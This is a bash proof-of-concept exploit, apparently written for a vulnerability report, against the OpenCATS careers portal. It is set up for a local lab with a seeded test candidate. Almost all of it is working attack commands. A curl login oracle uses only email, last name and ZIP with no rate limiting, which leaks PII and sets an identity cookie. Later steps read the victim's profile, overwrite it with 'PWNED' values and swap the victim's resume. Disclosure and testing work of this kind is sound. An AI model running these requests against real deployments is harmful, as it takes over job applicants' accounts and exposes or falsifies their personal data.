#!/usr/bin/env bash
# OPENCATS-D2N1 PoC - unauthenticated candidate portal account takeover (seeded example data only)
# Prereq: careers portal enabled + candidateRegistration enabled (documented operating mode).
# All values below are the seeded lab candidate from the verification transcript
# (alice.smith@example.com / Smith / 10001) - replace with a candidate whose triple you
# are authorized to test.

set -euo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1:8080}"
C="/tmp/opencats-cookie.txt"
rm -f "$C"

# 1) Login oracle: the default registration template's only "credentials" are
#    email + last name + ZIP (no captcha on this path, no rate limiting - 20/20
#    consecutive wrong guesses returned HTTP 200 with no lockout during verification).
curl -s -c "$C" -X POST "${BASE_URL}/careers/index.php?m=careers&p=applyToJob&ID=1" \
  --data 'applyToJobSubAction=processLogin' \
  --data 'isNew=no' \
  --data 'email=alice.smith@example.com' \
  --data 'lastName=Smith' \
  --data 'zip=10001' \
  --data 'rememberMe=yes' | grep -E 'value="(Alice|Smith|1 Main Street|555-0100)"|candidateID'
# -> victim PII pre-filled + candidateID disclosed + 2-week identity cookie cats1cw saved.

# Control: wrong ZIP -> no prefill, no cookie.
# curl -s -X POST ... --data 'zip=99999' ...   (no value="Alice", no Set-Cookie)

# 2) Account takeover with only the identity cookie: read the victim profile.
curl -s -b "$C" "${BASE_URL}/careers/index.php?m=careers&p=showAll&pa=updateProfile" \
  | grep -E 'My Profile|value="Alice"'

# 3) Overwrite the victim's PII.
curl -s -b "$C" -X POST "${BASE_URL}/careers/index.php?m=careers&p=onRegisteredCandidateProfile" \
  --data 'firstName=Alice' --data 'lastName=Smith' \
  --data 'email1=alice.smith@example.com' \
  --data 'phoneWork=666-PWNED' \
  --data 'address=66 Attacker Lane' \
  --data 'city=New York' --data 'state=NY' --data 'zip=10001' --data 'country=US' \
  --data 'keySkills=PWNED by attacker' \
  --data 'bestTimeToCall=Never' \
  --data 'attachmentID=-1' -o /dev/null -w '%{http_code}\n'   # -> 302

# 4) Replace the victim's resume (upload creates attachment; repeat with the new
#    attachmentID to trigger the delete+replace path: Attachments::delete + createFromFile).
printf 'ATTACKER-CONTROLLED RESUME\n' > /tmp/attacker_resume.txt
curl -s -b "$C" -X POST "${BASE_URL}/careers/index.php?m=careers&p=onRegisteredCandidateProfile" \
  -F 'firstName=Alice' -F 'lastName=Smith' -F 'email1=alice.smith@example.com' \
  -F 'zip=10001' -F 'attachmentID=<EXISTING_ATTACHMENT_ID>' \
  -F 'file=@/tmp/attacker_resume.txt' -o /dev/null -w '%{http_code}\n'
